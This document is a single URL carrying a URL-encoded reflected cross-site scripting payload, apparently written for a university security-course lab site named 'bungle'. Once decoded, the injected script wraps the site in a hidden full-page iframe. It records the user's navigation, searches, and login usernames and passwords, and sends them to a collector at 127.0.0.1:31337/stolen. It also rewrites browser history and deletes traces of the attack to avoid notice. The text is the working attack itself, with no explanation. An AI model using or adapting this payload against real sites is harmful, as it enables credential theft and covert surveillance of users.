http://bungle-cs461.cs.illinois.edu/./search?xssdefense=0&q=%3Cscript%3Efunction%20payload(attacker)%20%0A%7B%0A%20%20%20%20var%20targetURL%3D%22http%3A%2F%2Fbungle-cs461.cs.illinois.edu%2F%22%3B%0A%20%20%20%20var%20firstFlag%20%3D%200%3B%0A%20%20%20%20var%20searchFlag%3D0%3B%0A%20%20%20%20var%20bufferNext%3D%22%22%3B%0A%0A%20%20%20%20function%20log(data)%20%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20console.log(%24.param(data))%3B%0A%20%20%20%20%20%20%20%20%24.get(attacker%2C%20data)%3B%0A%20%20%20%20%7D%0A%20%20%20%20function%20proxy()%20%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24('body').contents().hide()%3B%0A%20%20%20%20%20%20%20%20var%20frameUsed%20%3D%20%24('%3Ciframe%20id%3Drecord%3E')%0A%20%20%20%20%20%20%20%20.attr('src'%2CtargetURL)%0A%20%20%20%20%20%20%20%20.attr('sandbox'%2C%20'allow-forms%20allow-scripts%20allow-same-origin')%0A%20%20%20%20%20%20%20%20.css(%7B%0A%09%20%20%20%20%20%20%20%20width%3A%20'100%25'%2C%0A%09%20%20%20%20%20%20%20%20height%3A%20'100%25'%2C%0A%09%20%20%20%20%20%20%20%20background%3A%20'white'%2C%0A%09%20%20%20%20%20%20%20%20position%3A%20'absolute'%2C%0A%09%20%20%20%20%20%20%20%20border%3A%200%0A%09%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20.appendTo('body')%0A%20%20%20%20%20%20%20%20.load(function()%20%0A%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%09%20%20%20%20%24(this.contentDocument)%0A%20%20%20%20%20%20%20%20%20%20%20%20.find('a')%0A%20%20%20%20%20%20%20%20%20%20%20%20.click(function()%20%0A%09%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A'nav'%2C%20user%3A%20%24(%22%23record%22).contents().find(%22%23logged-in-user%22).text()%2Curi%3A%20this.href%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.history.replaceState(%7B%7D%2C%22%22%2Cthis.href)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%20%20%20.end()%0A%20%20%20%20%09%20%20%20%20.find('form')%0A%20%20%20%20%09%20%20%20%20.submit(function()%20%0A%20%20%20%20%09%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24(this).attr('action')%3D%3D%22.%2Fsearch%22)%0A%09%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%09%09window.history.replaceState(%7B%7D%2C%22%22%2C%22http%3A%2F%2Fbungle-cs461.cs.illinois.edu%2Fsearch%3Fq%3D%22%20%2B%20%24(%22%23_record%22).contents().find(%22%23query%22).val())%3B%0A%20%20%20%20%20%20%20%20%09%09log(%7Bevent%3A'nav'%2C%20user%3A%20%24(%22%23record%22).contents().find(%22%23logged-in-user%22).text()%2Curi%3A%20%22http%3A%2F%2Fbungle-cs461.cs.illinois.edu%2Fsearch%3F%22%20%2B%20%22q%3D%22%20%2B%20%24(%22%23record%22).contents().find(%22%23query%22).val()%7D)%3B%0A%09%09%09searchFlag%3D1%3B%0A%09%09%09bufferNext%3D%24(%22%23record%22).contents().find(%22%23query%22).val()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%09else%20if(%24(this).attr('action')%20%3D%3D%20%22.%2Flogin%22)%20%0A%09%20%20%20%20%09%7B%0A%20%20%20%20%20%20%20%20%09%09log(%7Bevent%3A%20'login'%2C%20user%3A%20%20%24(this).serialize().substring(%20%24(this).serialize().indexOf(%22%3D%22)%20%2B%201%2C%20%20%24(this).serialize().indexOf(%22%26%22))%2C%20pass%3A%20%20%24(this).serialize().substring(%20%24(this).serialize().lastIndexOf(%22%3D%22)%20%2B%201%2C%20%20%24(this).serialize().length)%7D)%3B%0A%09%09%09window.history.replaceState(%7B%7D%2C%22%22%2CtargetURL)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%20if(%24(this).attr('action')%20%3D%3D%20%22.%2Flogout%22)%0A%09%20%20%20%20%09%7B%0A%20%20%20%20%20%20%20%20%20%20%20%09%09log(%7Bevent%3A%20'logout'%2C%20user%3A%20%24(%22%23record%22).contents().find(%22%23logged-in-user%22).text()%7D)%3B%0A%09%09%09window.history.replaceState(%7B%7D%2C%22%22%2CtargetURL)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%20%20.end()%3B%0A%0A%09%20%20%20%20%24(%22%23record%22).contents().find(%22.history-item%22).remove(%22%3Acontains('attacker')%22)%3B%0A%09%20%20%20%20if(firstFlag%20%3D%3D%200)%0A%09%20%20%20%20%7B%0A%09%20%20%20%20%20%20%20%20window.history.replaceState(%7B%7D%2C%22%22%2CtargetURL)%3B%0A%09%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%22nav%22%2C%20user%3A%20%24(%22%23record%22).contents().find(%22%23logged-in-user%22).text()%2Curi%3A%20targetURL%7D)%3B%0A%09%20%20%20%20%20%20%20%20firstFlag%20%3D%201%3B%0A%20%20%20%09%20%20%20%20%7D%0A%0A%09%20%20%20%20if(searchFlag)%7B%0A%09%09%09window.history.replaceState(%7B%7D%2C%22%22%2C%22http%3A%2F%2Fbungle-cs461.cs.illinois.edu%2Fsearch%3Fq%3D%22%2BbufferNext)%3B%0A%09%09%09searchFlag%20%3D%200%3B%0A%09%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%7D%0A%20%20%20%20proxy()%3B%0A%7D%3Bpayload(%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22)%3B%3C%2Fscript%3E
